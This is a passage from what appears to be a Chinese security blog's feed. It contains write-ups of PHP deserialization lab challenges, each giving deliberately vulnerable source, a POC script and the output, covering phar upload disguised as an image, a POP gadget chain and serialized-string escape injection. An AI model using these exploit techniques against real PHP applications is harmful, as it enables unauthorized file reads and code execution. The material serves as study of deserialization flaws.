<span class="keyword">echo</span> <span class="string">&quot;服务器检测到可疑前缀，启动了查杀程序&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Aquarius</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;aqu.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;aqu.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$aqu</span> = <span class="keyword">new</span> <span class="title class_">Aquarius</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$aqu</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;aqu.txt&quot;</span>, <span class="string">&quot;CSSEC&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">保证phar.readonly=Off，运行POC.php，生成aqu.phar，更改后缀名为.png上传，返回路径uploads/aqu.png，访问index.php，由于过滤参数首部的phar字符串，传入参数compress.zlib://phar://uploads/aqu.png</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Check</span><br><span class="line">Aquarius::__wakeup</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="phar反序列化漏洞" scheme="http://example.com/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>serVuln10 a phar</title>
    <link href="http://example.com/2023/12/22/serVuln10/"/>
    <id>http://example.com/2023/12/22/serVuln10/</id>
    <published>2023-12-22T13:10:23.000Z</published>
    <updated>2024-02-29T12:14:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Capricorn</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Capricorn&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Capricorn&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Capricorn</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;cap.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;cap.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$cap</span> = <span class="keyword">new</span> <span class="title class_">Capricorn</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$cap</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;cap.txt&quot;</span>, <span class="string">&quot;CSSEC&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">保证phar.readonly=Off，运行POC.php，生成cap.phar，更改后缀名为.png后上传，返回路径uploads/cap.png，访问index.php，传入参数Capricorn=phar://uploads/cap.png</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Capricorn::__wakeup</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/obtegmmu8g0pdewg">https://www.yuque.com/shiyizhesonder/sonder39/obtegmmu8g0pdewg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="phar反序列化漏洞" scheme="http://example.com/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>serVuln9 ezpop</title>
    <link href="http://example.com/2023/12/22/serVuln9/"/>
    <id>http://example.com/2023/12/22/serVuln9/</id>
    <published>2023-12-22T13:09:23.000Z</published>
    <updated>2024-02-29T12:14:09.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sagittarius</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$arrow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;arrow);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Guardian</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$jupiter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zeus</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;jupiter-&gt;zeus;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;zeus;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Target</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sagittarius&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sagittarius&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>             </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sagittarius</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$arrow</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Guardian</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$jupiter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zeus</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Target</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Sagittarius</span>();</span><br><span class="line"><span class="variable">$g</span> = <span class="keyword">new</span> <span class="title class_">Guardian</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Target</span>();</span><br><span class="line"><span class="variable">$g</span>-&gt;zeus = <span class="variable">$g</span>;</span><br><span class="line"><span class="variable">$g</span>-&gt;zeus-&gt;jupiter = <span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;source = <span class="variable">$s</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$g</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A8%3A%22Guardian%22%3A2%3A%7Bs%3A7%3A%22jupiter%22%3BO%3A6%3A%22Target%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A11%3A%22Sagittarius%22%3A1%3A%7Bs%3A18%3A%22%00Sagittarius%00arrow%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7Ds%3A4%3A%22zeus%22%3Br%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guardian::__wakeup</span><br><span class="line">Guardian::__toString</span><br><span class="line">Target::__get</span><br><span class="line">Sagittarius::__invoke</span><br><span class="line">Sagittarius::append</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br><span class="line">Catchable fatal error:  Method Guardian::__toString() must return a string value in /var/www/html/module/source.php on line 36</span><br></pre></td></tr></table></figure><p><code>pop</code> 链入口：<code>Guardian::__wakeup</code> </p><p><code>pop</code> 链目标：<code>Sagittarius::__invoke</code> </p><p>参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/dgqgwnxbpu74mvvc">https://www.yuque.com/shiyizhesonder/sonder39/dgqgwnxbpu74mvvc</a></p><p><a href="https://www.yuque.com/shiyizhesonder/sonder39/wknqdphecihy73u1">https://www.yuque.com/shiyizhesonder/sonder39/wknqdphecihy73u1</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="pop链" scheme="http://example.com/tags/pop%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>serVuln8 反序列化字符增加逃逸</title>
    <link href="http://example.com/2023/12/22/serVuln8/"/>
    <id>http://example.com/2023/12/22/serVuln8/</id>
    <published>2023-12-22T13:08:23.000Z</published>
    <updated>2024-02-29T12:14:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$params</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scorpio</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$hobby</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$trait</span> = <span class="string">&#x27;Mystery&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hobby</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hobby = <span class="variable">$hobby</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Scorpio&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">new</span> <span class="title class_">Scorpio</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Scorpio&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$serData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$serData</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;<span class="class"><span class="keyword">trait</span> === &#x27;<span class="title">escaping</span>&#x27;) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>       </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$params</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scorpio</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$hobby</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$trait</span> = <span class="string">&#x27;Mystery&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hobby</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hobby = <span class="variable">$hobby</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo serialize(new Scorpio(&quot;1&quot;));</span></span><br><span class="line"><span class="comment">//测试 O:7:&quot;Scorpio&quot;:2:&#123;s:5:&quot;hobby&quot;;s:1:&quot;1&quot;;s:5:&quot;trait&quot;;s:7:&quot;Mystery&quot;;&#125;</span></span><br><span class="line"><span class="comment">//需要逃逸的内容：&quot;;s:5:&quot;trait&quot;;s:8:&quot;escaping&quot;;&#125; 30个字符</span></span><br><span class="line"><span class="variable">$repeat</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;/&quot;</span>, <span class="number">10</span>);</span><br><span class="line"><span class="variable">$hobby</span> = <span class="variable">$repeat</span> . <span class="string">&#x27;&quot;;s:5:&quot;trait&quot;;s:8:&quot;escaping&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hobby</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Scorpio</span>(<span class="variable">$hobby</span>));</span><br><span class="line"><span class="comment">//echo $param;</span></span><br><span class="line"><span class="comment">//本地测试payload</span></span><br><span class="line"><span class="comment">//$s = unserialize(filter($param));</span></span><br><span class="line"><span class="comment">//if ($s-&gt;trait == &#x27;escaping&#x27;) &#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;🎉️congratulation&quot;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//////////&quot;;s:5:&quot;trait&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传入<code>paylaod</code> ，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(Scorpio)#1 (2) &#123;</span><br><span class="line">  [&quot;hobby&quot;]=&gt;</span><br><span class="line">  string(40) &quot;//////////&quot;;s:5:&quot;trait&quot;;s:8:&quot;escaping&quot;;&#125;&quot;</span><br><span class="line">  [&quot;trait&quot;]=&gt;</span><br><span class="line">  string(7) &quot;Mystery&quot;</span><br><span class="line">&#125;</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure><p>利用<code>filter()</code>函数增多字符串，使得<code>&quot;;s:5:&quot;trait&quot;;s:8:&quot;escaping&quot;;&#125;</code>被多出来的30个字符挤到第2参数的位置，而原本的第2参数将会由于<code>&#125;</code>的提前闭合而无效化</p><p>参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/xps4p25lgkgwi2a8">https://www.yuque.com/shiyizhesonder/sonder39/xps4p25lgkgwi2a8</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="反序列化字符增加逃逸" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%8A%A0%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>serVuln7 __call与属性的初始值</title>
    <link href="http://example.com/2023/12/22/serVuln7/"/>
    <id>http://example.com/2023/12/22/serVuln7/</id>
    <published>2023-12-22T13:07:23.000Z</published>
    <updated>2024-02-29T12:14:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Justice</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tail</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable">$head</span> = <span class="variable language_">$this</span>-&gt;head;</span><br><span class="line">        <span class="variable">$tail</span> = <span class="variable language_">$this</span>-&gt;tail;</span><br><span class="line">        <span class="variable">$head</span>-&gt;<span class="variable">$tail</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Libra</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$func</span> === <span class="string">&#x27;symbolize&#x27;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;name === <span class="string">&#x27;balance&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Libra&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Libra&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>                        </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Justice</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tail</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head = <span class="keyword">new</span> <span class="title class_">Libra</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tail = <span class="string">&#x27;symbolize&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Libra</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;balance&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Justice</span>());</span><br><span class="line"><span class="comment">//O:7:&quot;Justice&quot;:2:&#123;s:13:&quot; Justice head&quot;;O:5:&quot;Libra&quot;:1:&#123;s:4:&quot;name&quot;;s:7:&quot;balance&quot;;&#125;s:13:&quot; Justice tail&quot;;s:9:&quot;symbolize&quot;;&#125;</span></span><br><span class="line"><span 